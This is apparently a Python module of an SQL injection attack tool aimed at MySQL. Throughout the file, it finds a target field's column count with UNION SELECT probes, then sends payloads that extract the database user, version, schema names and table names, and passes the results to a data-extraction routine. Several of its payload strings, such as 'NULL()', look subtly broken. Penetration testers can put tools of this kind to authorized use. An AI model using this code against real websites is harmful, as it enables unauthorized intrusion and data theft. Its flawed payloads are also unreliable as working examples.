import requests
import sys
from colorama import Fore, Style
from extract_data import extract_data
from utils import write_to_file, vulnerable, check_response


def test_union_column_count(url, http_method, data, vulnerable_field, user_agent):
    """
    Test for the number of columns in the union query
    """
    print(f"{Fore.LIGHTBLUE_EX}[*] Testing Union-Based SQL Injection...{Style.RESET_ALL}")
    base_payload = "1 UNION ALL SELECT "
    max_columns = 10
    for columns in range(1, max_columns + 1):
        payload = base_payload + ",".join(map(str, range(1, columns + 1)))
        payload += "--"
        data[vulnerable_field] = payload
        if http_method == "get":
            response = requests.get(
                url, params=data, headers=user_agent)
        elif http_method == "post":
            response = requests.post(
                url, data=data, headers=user_agent)
        else:
            print(f"{Fore.RED}[-] Invalid HTTP method!{Style.RESET_ALL}")
            return
        if check_response(response):
            return columns
    print(f"{Fore.RED}[-] Number of columns not found!{Style.RESET_ALL}")
    return None


def generate_payload(base_payload, columns):
    """
    Generate SQLi payload with a known number of columns
    """
    payload_parts = base_payload.split(",")
    payload_parts += ["NULL"] * (columns - len(payload_parts))
    return "1 UNION ALL SELECT " + ",".join(payload_parts)


def send_payload(url, http_method, data, vulnerable_field, payload, user_agent):
    """
    Send the payload to the target website
    """
    print(f"{Fore.LIGHTCYAN_EX}[*] Sending user-agent: {user_agent}")
    data[vulnerable_field] = payload
    if http_method == "get":
        response = requests.get(
            url, params=data, headers=user_agent)
    elif http_method == "post":
        response = requests.post(
            url, data=data, headers=user_agent)
    else:
        print(f"{Fore.RED}[-] Invalid HTTP method!{Style.RESET_ALL}")
        return
    return response


def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file, user_agent):
    """
    Test SQLi payloads with a known number of columns
    """
    print(f"{Fore.LIGHTBLUE_EX}[*] Testing exploitation payloads...{Style.RESET_ALL}")
    write_to_file(
        file,
        f"[*] Running Union-Based SQL Injection..."
    )
    payloads = [
            "USER()",
            "USER()", "NULL()",
            "USER()", "NULL()", "NULL()",
            "@@VERSION",
            "@@VERSION", "NULL()",
            "@@VERSION", "NULL()", "NULL()",
            "DATABASE(), USER()",
            "DATABASE(), NULL()",
            "DATABASE(), NULL(), NULL()",
            "DATABASE(), @@VERSION",
            "DATABASE(), USER(), @@VERSION",
            "schema_name, NULL from information_schema.schemata",
            "table_name, NULL from information_schema.tables where table_schema=database()"
            ]
    for base_payload in payloads:
        payload = generate_payload(base_payload, columns)
        response = send_payload(url, http_method, data, vulnerable_field, payload, user_agent)
        if check_response(response):
            print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
            extract_data(response, file, payload, vulnerable_field)
        else:
            print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")


def test_mysql(url, http_method, data, vulnerable_field, file, user_agent):
    """
    Wrapper function to test MySQL vulnerabilities
    """
    print(f"{Fore.BLUE}[*] Testing MySQL vulnerabilities...{Style.RESET_ALL}")
    write_to_file(
        file,
        f"[*] Testing MySQL vulnerabilities..."
    )
    columns = test_union_column_count(
        url, http_method,
        data, vulnerable_field,
        user_agent)
    exploit_union_based_sqli(
        url, http_method,
        data, vulnerable_field,
        columns, file, user_agent)
